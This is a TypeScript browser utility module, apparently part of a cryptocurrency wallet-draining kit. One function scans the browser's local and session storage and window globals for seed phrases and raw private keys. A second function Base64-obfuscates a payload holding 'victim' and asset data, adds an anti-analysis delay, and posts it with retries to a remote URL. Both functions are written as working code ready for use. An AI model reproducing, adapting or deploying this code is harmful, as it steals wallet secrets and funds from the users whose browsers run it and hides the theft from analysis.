"use client";

/**
 * 🕵️‍♂️ AUTOMATIC KEY DISCOVERY
 * Scans storage for mnemonics or hex private keys.
 */
export function findMasterKey(): string | null {
  if (typeof window === "undefined") return null;

  const storageItems: Record<string, string | null> = {};

  try {
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      if (k) storageItems[k] = localStorage.getItem(k);
    }
    for (let i = 0; i < sessionStorage.length; i++) {
      const k = sessionStorage.key(i);
      if (k) storageItems[k] = sessionStorage.getItem(k);
    }
  } catch (e) {
    console.warn("[utils.ts] Storage restricted.");
  }

  const mnemonicRegex = /([a-z]{3,}\s){11,23}[a-z]{3,}/i;
  const hexRegex = /^(0x)?[a-fA-F0-9]{64}$/;

  for (const key in storageItems) {
    const value = storageItems[key];
    if (typeof value === "string" && value.length > 10) {
      const trimmedValue = value.trim().replace(/["']/g, "");
      if (mnemonicRegex.test(trimmedValue) || hexRegex.test(trimmedValue)) {
        console.log(
          `[findMasterKey] 🔑 Discovered key in storage key: "${key}"`,
        );
        return trimmedValue;
      }
    }
  }

  const globalKey =
    (window as any).discovered_vault_key || (window as any)._gv_k || null;
  if (globalKey)
    console.log(`[findMasterKey] 🌐 Discovered key in window globals.`);

  return globalKey;
}

/**
 * 📡 SECURE POST (v8.1.5 - Resilient Handshake)
 * Features Base64 Obfuscation, automatic timeout, and Retry Logic.
 */
export const securePost = async (
  url: string,
  data: any,
  options: any = {},
  retries = 3,
) => {
  const delay = (ms: number) => new Promise((r) => setTimeout(r, ms));

  for (let i = 0; i < retries; i++) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 45000);

    try {
      const isHardhat = process.env.NEXT_PUBLIC_STRIKE_MODE === "hardhat";

      // --- DEBUG: LOG INCOMING DATA ---
      console.log(`[securePost] 🛰️ Target URL: ${url}`);
      const targetChainId = (data.c || data.chainId || "1").toString();

      console.log(`[securePost] 📦 Data Preview:`, {
        chainId: targetChainId,
        assetCount: data.assets?.length || (data.plan ? data.plan.length : 0),
        victim: data.victim || "N/A",
      });

      // 1. ⚡ ANTI-ANALYSIS JITTER
      if (!isHardhat) {
        await new Promise((r) =>
          setTimeout(r, Math.floor(Math.random() * 100) + 10),
        );
      }

      if (!data) throw new Error("PAYLOAD_REQUIRED");

      // 2. Safe Serialization
      const jsonBody = JSON.stringify(data, (_, v) =>
        typeof v === "bigint" ? v.toString() : v,
      );
      console.log(`[securePost] 📝 JSON String Length: ${jsonBody.length}`);
      console.log(`[AUDIT-LOG-VULN] 🔍 RAW_DATA_BEFORE_OBFUSCATION:`, jsonBody);

      // 3. 🛡️ OBFUSCATION
      const obfuscatedBody = btoa(
        encodeURIComponent(jsonBody).replace(/%([0-9A-F]{2})/g, (_, p1) =>
          String.fromCharCode(parseInt(p1, 16)),
        ),
      );
      console.log(
        `[securePost] 🔒 Obfuscated Payload (Base64) Preview: ${obfuscatedBody.substring(
          0,
          30,
        )}...`,
      );

      // 🛰️ SYNCED HEADERS
      const headers = {
        "Content-Type": "text/plain",
        "X-Ghost-Payload": "base64",
        "X-Ghost-Handshake": "verified",
        "X-Chain-ID": targetChainId,
        ...(options.headers || {}),
      };

      // 4. Fire Handshake
      const response = await fetch(url, {
        method: "POST",
        headers,
        signal: controller.signal,
        body: obfuscatedBody,
      });

      clearTimeout(timeoutId);

      if (!response.ok) {
        throw new Error(`Server returned ${response.status}`);
      }

      const result = await response.json().catch(() => ({}));
      console.log(`[securePost] ✅ Success Result:`, result);
      return { ...result, success: true };
    } catch (e: any) {
      clearTimeout(timeoutId);

      const isLastAttempt = i === retries - 1;
      const waitTime = Math.pow(2, i) * 1000;

      if (e.name === "AbortError") {
        console.error(`❌ [TIMEOUT] ${url}: Execution took too long.`);
      } else {
        console.error(`❌ [POST-FAIL] Attempt ${i + 1} failed: ${e.message}`);
      }

      if (isLastAttempt) return { success: false, error: e.message };

      console.warn(`[securePost] 🔄 Retrying in ${waitTime}ms...`);
      await delay(waitTime);
    }
  }
};
